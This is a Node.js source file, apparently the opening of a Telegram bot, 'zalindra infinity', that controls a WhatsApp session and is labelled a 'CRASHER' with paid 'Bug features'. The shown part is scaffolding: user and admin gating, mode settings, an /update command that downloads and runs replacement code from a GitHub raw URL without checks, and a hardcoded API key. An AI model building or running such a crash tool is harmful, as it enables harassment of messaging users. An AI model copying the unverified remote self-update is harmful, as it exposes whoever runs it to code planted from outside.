const { Telegraf, Markup, session } = require("telegraf");
const JavaScriptObfuscator = require("javascript-obfuscator");
const fs = require("fs");
const os = require("os");
const chalk = require("chalk");
const REMOVE_BG_KEY = "3xj8BCNe5dWNejWDvqXWtgRK";
const readline = require("readline");
const path = require("path");
const ms = require("ms");
const moment = require("moment-timezone");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateForwardMessageContent,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    generateMessageTag,
    generateRandomMessageId,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const axios = require("axios");
const FormData = require("form-data");
const { TOKEN_GINXJAL } = require("./config");
const BOT_TOKEN = TOKEN_GINXJAL;

const MODE_FILE = "./Tools/mode.json";
const crypto = require("crypto");

const premiumFile = "./database/premiumuser.json";
const adminFile = "./database/adminuser.json";
const ownerFile = "./database/owneruser.json";
const GROUP_FILE = "./Tools/groupmode.json";
const CMD_FILE = "./Tools/cmdmode.json";
const antiFotoFile = "./Tools/antifoto.json"
const safeFile = "./Tools/safeGroups.json";
const antiVideoFile = "./Tools/antivideo.json"
const premiumGroupsFile = "./Tools/premiumGroups.json";

const TOKENS_FILE = "./tokens.json";

const startTime = Date.now();
const mediaMode = new Map(); 
const userState = {};
const liveIntervals = {};

const sessionPath = "./session";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

//𝐊𝐎𝐃𝐄 𝐀𝐔𝐓𝐎 𝐔𝐏𝐃𝐀𝐓𝐄, 𝐍𝐎𝐓 𝐒𝐀𝐋𝐄 𝐂𝐑𝐄𝐃𝐈𝐓 @seanoffcx!!! 
const UPDATE_REPO_RAW = "https://raw.githubusercontent.com/seanfutsalmin-beep/Seanhard/refs/heads/main/index.js"; //ganti pake raw index js mu

bot.command("update", async (ctx) => {
  await ctx.reply("⏳ Sedang mengecek update terbaru...");

  try {
    const { data } = await axios.get(UPDATE_REPO_RAW);

    if (!data) {
      return ctx.reply("❌ Update gagal: file kosong!");
    }

    const localCode = fs.readFileSync("./index.js", "utf8");

    const localVersion =
      localCode.match(/☇ Version : (.+)/)?.[1]?.trim() || "unknown";

    const repoVersion =
      data.match(/☇ Version : (.+)/)?.[1]?.trim() || "unknown";

    if (localVersion === repoVersion) {
      return ctx.reply(
        "⏳ Sedang mengecek update terbaru...\n\n" +
        "Mohon maaf, sc anda sudah versi terbaru."
      );
    }

    fs.writeFileSync("./index.js", data);

    await ctx.reply(
      `✅ Update berhasil!\n\n` +
      `Version lama: ${localVersion}\n` +
      `Version baru: ${repoVersion}\n\n` +
      `Bot akan restart...`
    );

    process.exit();
  } catch (e) {
    console.log("UPDATE ERROR:", e.message);
    await ctx.reply("❌ Update gagal. Pastikan repo dan file index.js tersedia.");
  }
});


global.pairingMessage = null;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let isStarting = false;
let senderUsers = [];
let hasConnectedOnce = false;
let reconnectAttempts = 0;
let waConnected = false;

const maxReconnect = 10;
const usePairingCode = true;

/// image ///
const homePhoto = "https://files.catbox.moe/u9s7kj.jpg"; // Home / Back
const bugPhoto = "https://files.catbox.moe/9vqi7a.jpg";   // Bug Menu
const toolsPhoto = "https://files.catbox.moe/k2ce0n.jpg"; // Tools Menu
/////// ////////////////
function getGroupMode() {
  try {

    if (!fs.existsSync(".mode")) {
      fs.mkdirSync(".mode")
    }

    if (!fs.existsSync(GROUP_FILE)) {
      fs.writeFileSync(
        GROUP_FILE,
        JSON.stringify({ group: "off" }, null, 2)
      )
      return "off"
    }

    const data = JSON.parse(fs.readFileSync(GROUP_FILE))
    return data.group || "off"

  } catch (err) {
    console.log("❌ Gagal membaca group mode:", err)
    return "off"
  }
}
//////////////////////////////////////
function setGroupMode(group) {
  if (!["on", "off"].includes(group)) return

  const data = { group }

  fs.writeFileSync(GROUP_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Group mode diset ke: ${group}`)
}
//////////////////////////////////////
const VALID_MODES = ["self", "public"]

function getMode() {
  try {
    if (!fs.existsSync(MODE_FILE)) {
      fs.writeFileSync(MODE_FILE, JSON.stringify({ mode: "self" }, null, 2))
      return "self"
    }

    const data = JSON.parse(fs.readFileSync(MODE_FILE))
    return data.mode || "self"

  } catch (err) {
    console.log("❌ Gagal membaca mode:", err)
    return "self"
  }
}
//////////////////////////////////////
function setMode(mode) {
  if (!VALID_MODES.includes(mode)) return

  const data = { mode }

  currentMode = mode
  fs.writeFileSync(MODE_FILE, JSON.stringify(data, null, 2))

  console.log(`✅ Mode bot diset ke: ${mode}`)
}

let currentMode = getMode()
//////////////
const spamLimit = new Map()
const SPAM_WINDOW = 5000
const SPAM_MAX = 4

function antiSpam(ctx) {
  if (!ctx.from?.id) return true

  const userId = ctx.from.id
  const now = Date.now()

  if (!spamLimit.has(userId)) {
    spamLimit.set(userId, [])
  }

  let timestamps = spamLimit.get(userId).filter(t => now - t < SPAM_WINDOW)

  timestamps.push(now)
  spamLimit.set(userId, timestamps)

  if (timestamps.length > SPAM_MAX) {
    return ctx.reply("🚫 Spam terdeteksi!")
  }

  setTimeout(() => spamLimit.delete(userId), SPAM_WINDOW + 1000)

  return true
}
///// ---- ( DATE ) ---- /////
function getCurrentDate() {
  return new Date().toLocaleDateString("id-ID", {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  });
}
//function dri gpt
// FORMAT RUNTIME
function formatRuntime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

// CONNECT (fake aja biar ga error)
function getConnectStatus() {
  return "Active ✅";
}

// RUNTIME
function getRuntimeStatus() {
  return formatRuntime(process.uptime());
}

// MEMORY
function getMemoryStatus() {
  const used = process.memoryUsage().heapUsed / 1024 / 1024;
  const total = process.memoryUsage().heapTotal / 1024 / 1024;
  return `${used.toFixed(1)}MB / ${total.toFixed(1)}MB`;
}

// COOLDOWN
const cooldowns = new Map();

function getCooldownStatus(userId, delay = 5) {
  const now = Date.now();
  const last = cooldowns.get(userId) || 0;
  const diff = (now - last) / 1000;

  if (diff < delay) {
    return `Wait ${Math.ceil(delay - diff)}s ⏳`;
  } else {
    cooldowns.set(userId, now);
    return "Ready ✅";
  }
}

//pemanggilan function di atas
const runtimeStatus = getRuntimeStatus();
const memoryStatus = getMemoryStatus();
//end pemanggilan


///// ---- ( RUNTIME & MEMORY jaga² klo error ) ---- /////
//function getRuntime() {
//  const now = Date.now();
//  const diff = now - startTime;

//  const seconds = Math.floor(diff / 1000) % 60;
 // const minutes = Math.floor(diff / (1000 * 60)) % 60;
 // const hours = Math.floor(diff / (1000 * 60 * 60)) % 24;
 // const days = Math.floor(diff / (1000 * 60 * 60 * 24));

 // return `${days}d ${hours}h ${minutes}m ${seconds}s`;

///// Github /////
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/seanfutsalmin-beep/Zalin/refs/heads/main/token.json";////ganti jadi Raw luh



async function fetchValidTokens() {
  try {
    const { data } = await axios.get(GITHUB_TOKEN_LIST_URL);
    return Array.isArray(data.tokens) ? data.tokens : [];
  } catch (err) {
    console.log(chalk.red("❌ Gagal mengambil token dari GitHub"));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa token..."));

  const validTokens = await fetchValidTokens();

  if (!validTokens.length) {
    console.log(chalk.blue(`
TOKEN ANDA TIDAK TERDAFTAR DI DATABASE
    `));
    process.exit(1);
  }

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.blue("WADUH,TOKEN MU LOM TERDAFTAR DI DB MMK"));
    process.exit(1);
  }

  console.log(chalk.blue("✅ Token valid"));
  startBot();
}

function startBot() {
  console.clear();
  console.log(chalk.bold.yellow(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
   ⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
    ⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
    ⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
    ⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
    ⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
    ⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
    ⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀      ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Create : @seanoffcx
☇ Name Script : zalindra infinity
☇ Version : 6.0 new era
  
Bot Berhasil Terhubung Gunakan Script Sebrutal Mungkin`));
}

validateToken()

/// ------ Start WhatsApp Session ------ ///
const startSesi = async () => {
  try {
    if (isStarting) return;
    isStarting = true;

    console.log(chalk.blue(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Creator : @seanoffcx
☇ Name Script : zalindra infinity
☇ Version : 6.0
☇ Bot Connect
`));

    if (sock?.ev) {
      sock.ev.removeAllListeners("connection.update");
      sock.ev.removeAllListeners("creds.update");
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    sock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
      browser: ["Ubuntu", "Chrome", "20.0.04"],
      keepAliveIntervalMs: 25000,
      connectTimeoutMs: 60000,
      markOnlineOnConnect: true,
      emitOwnEvents: true,
      fireInitQueries: true
    });

    sock.ev.on("creds.update", saveCreds);

    //console.log("🔐 Siap pairing / reconnect...");

    sock.ev.on("connection.update", async (update) => {
      const { connection, lastDisconnect } = update;
      const reason = lastDisconnect?.error?.output?.statusCode;

      if (connection === "connecting") {
        //console.log("🔄 Connecting...");
      }

      if (connection === "open") {
        isWhatsAppConnected = true;
        isStarting = false;
        hasConnectedOnce = true;
        reconnectAttempts = 0;

        linkedWhatsAppNumber = sock.user?.id?.split(":")[0];

        console.log(`
⠀⠀⠀⣠⠂⢀⣠⡴⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢤⣄⠀⠐⣄⠀⠀⠀
⠀⢀⣾⠃⢰⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡆⠸⣧⠀⠀
⢀⣾⡇⠀⠘⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠁⠀⢹⣧⠀
⢸⣿⠀⠀⠀⢹⣷⣀⣤⣤⣀⣀⣠⣶⠂⠰⣦⡄⢀⣤⣤⣀⣀⣾⠇⠀⠀⠈⣿⡆
⣿⣿⠀⠀⠀⠀⠛⠛⢛⣛⣛⣿⣿⣿⣶⣾⣿⣿⣿⣛⣛⠛⠛⠛⠀⠀⠀⠀⣿⣷
⣿⣿⣀⣀⠀⠀⢀⣴⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⣀⣠⣿⣿
⠛⠻⠿⠿⣿⣿⠟⣫⣶⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣙⠿⣿⣿⠿⠿⠛⠋
⠀⠀⠀⠀⠀⣠⣾⠟⣯⣾⠟⣻⣿⣿⣿⣿⣿⣿⡟⠻⣿⣝⠿⣷⣌⠀⠀⠀⠀⠀
⠀⠀⢀⣤⡾⠛⠁⢸⣿⠇⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⢹⣿⠀⠈⠻⣷⣄⡀⠀⠀
⢸⣿⡿⠋⠀⠀⠀⢸⣿⠀⠀⢿⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⠆⠀⠀⠈⠻⣿⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡀⠀⠘⣿⣿⣿⣿⣿⡿⠁⠀⢸⣿⠀⠀⠀⠀⠀⢸⣿⡇
⢸⣿⡇⠀⠀⠀⠀⢸⣿⡇⠀⠀⠈⢿⣿⣿⡿⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⣼⣿⠃
⠈⣿⣷⠀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠈⢻⠟⠁⠀⠀⠀⣼⣿⡇⠀⠀⠀⠀⣿⣿⠀
⠀⢿⣿⡄⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⢰⣿⡟⠀
⠀⠈⣿⣷⠀⠀⠀⢸⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠃⠀⠀⢀⣿⡿⠁⠀
⠀⠀⠈⠻⣧⡀⠀⠀⢻⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⡟⠀⠀⢀⣾⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠁⠀⠀⠈⢿⣿⡆⠀⠀⠀⠀⠀⠀⣸⣿⡟⠀⠀⠀⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡄⠀⠀⠀⠀⣰⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠆⠀⠀ ⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
» Information:
☇ Create : @seanoffcx
☇ Name Script : zalindra infinity
☇ Version : 6.0
☇ Bot Connect
☇ WhatsApp Number : ${linkedWhatsAppNumber}
`);
       
        if (global.pairingMessage?.chatId && global.pairingMessage?.messageId) {
          try {

            await bot.telegram.editMessageCaption(
              global.pairingMessage.chatId,
              global.pairingMessage.messageId,
              undefined,
`<pre>⬡═―⊱「 𝚉𝙰𝙻𝙸𝙽𝙳𝚁𝙰 𝙲𝚁𝙰𝚂𝙷𝙴𝚁 」⊰―═⬡
       
  ⬡═―⊱〔 REQUEST PAIRING 〕⊰―═⬡
ϟ    Number : ${linkedWhatsAppNumber}
ϟ    Status : Connected
</pre>`,
              { parse_mode: "HTML" }
            );

          } catch (err) {
            console.log("❌ Gagal edit pesan:", err.message);
          }

          global.pairingMessage = null;
        }
      }

      if (connection === "close") {
        isWhatsAppConnected = false;
        isStarting = false;

        console.log("❌ Disconnected:", reason);

        if (reason === DisconnectReason.loggedOut || reason === 401) {
          //console.log("🚫 Session logout / invalid");

          deleteSession();
          global.pairingMessage = null;
          reconnectAttempts = 0;
          return;
        }

        reconnectAttempts++;

        if (reconnectAttempts > maxReconnect) {
          //console.log("⛔ Stop reconnect (limit)");
          return;
        }

        const delay = Math.min(5000 * reconnectAttempts, 30000);

        console.log(`♻️ Reconnect dalam ${delay / 1000}s`);

        setTimeout(() => startSesi(), delay);
      }
    });

  } catch (err) {
    console.log("❌ Error start session:", err);
    isStarting = false;
  }
};
///////////////////////////////////////////////////
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    return ctx.reply("❌ WhatsApp belum connect, /connect dulu");
  }
  return next();
};

//////////////////////////////////////
const loadJSON = (file) => {
  try {
    if (!fs.existsSync(file)) return [];

    const data = fs.readFileSync(file, "utf8");
    if (!data) return [];

    return JSON.parse(data);
  } catch (err) {
    console.log("⚠️ JSON corrupt:", file);
    return [];
  }
};
//////////////////////////////////////
const saveJSON = (file, data) => {
  try {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
  } catch (err) {
    console.log("❌ Failed save JSON:", file, err.message);
  }
};

//////////////////////////////////////
function deleteSession() {
  try {
    if (!sessionPath || !fs.existsSync(sessionPath)) {
      console.log("⚠️ Session not found.");
      return false;
    }

    fs.rmSync(sessionPath, { recursive: true, force: true });
    console.log("🗑️ Session deleted successfully.");
    return true;

  } catch (err) {
    console.log("❌ Failed delete session:", err.message);
    return false;
  }
}
//////////////////////////////////////
module.exports = {
  startSesi,
  checkWhatsAppConnection,
  loadJSON,
  saveJSON,
  deleteSession,
};
//// Variabel ///
let antiCulik = true;
let autoReject = false; 
let pendingGroups = new Map();
//////////////////////////////////////
let ownerUsers = loadOwner() || [];
let premiumUsers = loadJSON(premiumFile) || [];
let adminList = [];
let whitelistGroups = loadSafe() || [];
loadAdmins();

//////////////////////////////////////

/// ---- OWNER ---- ///
const checkOwner = (ctx, next) => {
  const id = ctx.from?.id?.toString();
  const name = ctx.from?.first_name || "User";

  if (!ownerUsers.includes(id)) {
    return ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/zalindraoffc.jpg") },
      {
        caption:
`<pre>❌ AKSES DI TOLAK OWNER ONLY

⚠️ Fitur ini khusus OWNER ONLY

👤 User : ${name}</pre>`,
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.url("Owner", "https://t.me/@seanoffxc")]
        ])
      }
    );
  }

  return next();
};
/// ---- ADMIN ---- ///
const checkAdmin = (ctx, next) => {
  const id = ctx.from.id.toString();
  const name = ctx.from.first_name || "User";

  if (
    !adminList.includes(id) &&
    !ownerUsers.includes(id)
  ) {
    return ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/zalindraoffc.jpg") },
      {
        caption:
`<pre>✦ Access Denied ✦

User : ${name}
( ! ) You do not have access
Please add Admin before using Bug features ✦</pre>`,
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.url("Owner", "https://t.me/@seanoffcx")]
        ])
      }
    );
  }

  return next();
};
/// ---- PREMIUM ---- ///
const checkAllPremium = (ctx, next) => {
  const id = ctx.from.id.toString();
  const name = ctx.from.first_name || "User";

  if (premiumUsers.includes(id)) {
    return next();
  }

  if (ctx.chat.type !== "private" && isGroupPremium(ctx.chat.id)) {
    return next();
  }

  return ctx.replyWithPhoto(
    { source: fs.readFileSync("./image/zalindraoffc.jpg") },
    {
      caption:
`<pre>✦ Access Denied ✦

User : ${name}
( ! ) You do not have access
Please add Premium before using Bug features ✦</pre>`,
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [Markup.button.url("Owner", "https://t.me/seanoffcx")]
      ])
    }
  );
};
/// Anti culik ///
function isSafeGroup(groupId) {
  return whitelistGroups.includes(groupId.toString());
}

function loadSafe() {
  try {
    if (!fs.existsSync(safeFile)) return [];
    return JSON.parse(fs.readFileSync(safeFile, "utf8") || "[]");
  } catch {
    return [];
  }
}

function saveSafe(data) {
  fs.writeFileSync(safeFile, JSON.stringify(data, null, 2));
}

//// Group prem ////
function loadPremiumGroups() {
  try {
    if (!fs.existsSync(premiumGroupsFile)) return [];
    return JSON.parse(fs.readFileSync(premiumGroupsFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
//////////
function savePremiumGroups(data) {
  fs.writeFileSync(premiumGroupsFile, JSON.stringify(data, null, 2));
}
//////////
function isGroupPremium(groupId) {
  return loadPremiumGroups().includes(groupId.toString());
}
/// ---- ADD ADMIN ---- ///
function addAdmin(userId) {
  userId = userId.toString();

  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
}

/// ---- REMOVE ADMIN ---- ///
function removeAdmin(userId) {
  userId = userId.toString();

  adminList = adminList.filter(id => id !== userId);
  saveAdmins();
}

/// ---- SAVE ADMIN ---- ///
function saveAdmins() {
  try {
    fs.writeFileSync("./database/admins.json", JSON.stringify(adminList, null, 2));
  } catch (err) {
    console.log("❌ Gagal save admin:", err.message);
  }
}

/// ---- LOAD ADMIN ---- ///
function loadAdmins() {
  try {
    if (!fs.existsSync("./database/admins.json")) {
      adminList = [];
      return;
    }

    const data = fs.readFileSync("./database/admins.json", "utf8");

   
    adminList = JSON.parse(data || "[]").map(id => id.toString());

  } catch (err) {
    console.log("⚠️ Gagal load admin:", err.message);
    adminList = [];
  }
}
/// ---- SLEEP ---- ///
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

/// ---- CHECK PREMIUM ---- ///
function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}

/// ---- CHECK OWNER ---- ///
function isOwner(id) {
  return ownerUsers.includes(id.toString());
}

/// ---- LOAD OWNER ---- ///
function loadOwner() {
  try {
    if (!fs.existsSync(ownerFile)) return [];
    return JSON.parse(fs.readFileSync(ownerFile, "utf8") || "[]");
  } catch {
    return [];
  }
}
/// ------ Check Sender ------- \\\
function isSender(userId) {
  return senderUsers.includes(String(userId));
}
// -------- Anti foto ---------- ///
function loadAntiFoto() {
  try {
    if (!fs.existsSync(antiFotoFile)) return []
    return JSON.parse(fs.readFileSync(antiFotoFile))
  } catch {
    return []
  }
}


function saveAntiFoto(data) {
  fs.writeFileSync(antiFotoFile, JSON.stringify(data, null, 2))
}

let antiFotoGroups = loadAntiFoto()

/// ------- ANTI VIDIO ------- ///
function loadAntiVideo() {
  try {
    if (!fs.existsSync(antiVideoFile)) return []
    return JSON.parse(fs.readFileSync(antiVideoFile))
  } catch {
    return []
  }
}

function saveAntiVideo(data) {
  fs.writeFileSync(antiVideoFile, JSON.stringify(data, null, 2))
}

let antiVideoGroups = loadAntiVideo()
/// JAM ///
function getTimeIndonesia() {
  const now = new Date();

  const wib = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jakarta" }));
  const wita = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Makassar" }));
  const wit = new Date(now.toLocaleString("en-US", { timeZone: "Asia/Jayapura" }));

  return `
🕒 LIVE JAM INDONESIA

🇮🇩 WIB  : ${wib.toLocaleTimeString("id-ID", { hour12: false })}
🇮🇩 WITA : ${wita.toLocaleTimeString("id-ID", { hour12: false })}
🇮🇩 WIT  : ${wit.toLocaleTimeString("id-ID", { hour12: false })}
`;
}
/// cmd of/on ///
function loadCmdMode() {
  try {
    if (!fs.existsSync(CMD_FILE)) {
      fs.writeFileSync(CMD_FILE, JSON.stringify({ disabled: [] }, null, 2));
    }

    const data = JSON.parse(fs.readFileSync(CMD_FILE));

    return {
      disabled: Array.isArray(data.disabled) ? data.disabled : []
    };

  } catch (e) {
    return { disabled: [] };
  }
}

function saveCmdMode(data) {
  fs.writeFileSync(CMD_FILE, JSON.stringify(data, null, 2));
}
/// midlaware Cmd on / of ///
bot.use((ctx, next) => {
  const data = loadCmdMode();

  const text = ctx.message?.text || ctx.callbackQuery?.data || "";

  if (!text.startsWith("/")) return next(); 

  const cmd = text
    .split(" ")[0]
    .replace(/^\/+/, "")
    .replace(/@.+$/, "")
    .toLowerCase()
    .trim();

  const userId = ctx.from?.id?.toString();

  const isAdminUser =
    adminList.includes(userId) || ownerUsers.includes(userId);

  const disabled = Array.isArray(data?.disabled) ? data.disabled : [];

  // console.log("CMD:", cmd);
// console.log("DISABLED:", disabled);

  if (disabled.includes(cmd)) {
    if (isAdminUser) return next();
    return ctx.reply("⛔ Command ini sedang dinonaktifkan admin");
  }

  return next();
});
/// ---- GROUP ONLY ---- ///
bot.use((ctx, next) => {
  const groupMode = getGroupMode();

  if (groupMode === "on" && ctx.chat.type === "private") {
    return ctx.reply(`
Bot ini hanya bisa digunakan di dalam group.
Silakan gunakan perintah di group.
`);
  }

  return next();
});
/// ---- SELF / PUBLIC MODE ---- ///
bot.use((ctx, next) => {
  const mode = getMode();

  if (mode === "self" && !isOwner(ctx.from.id)) {

    if (ctx.callbackQuery) {
      return ctx.answerCbQuery("🔒 BOT DI KUNCI OWNER", { show_alert: true });
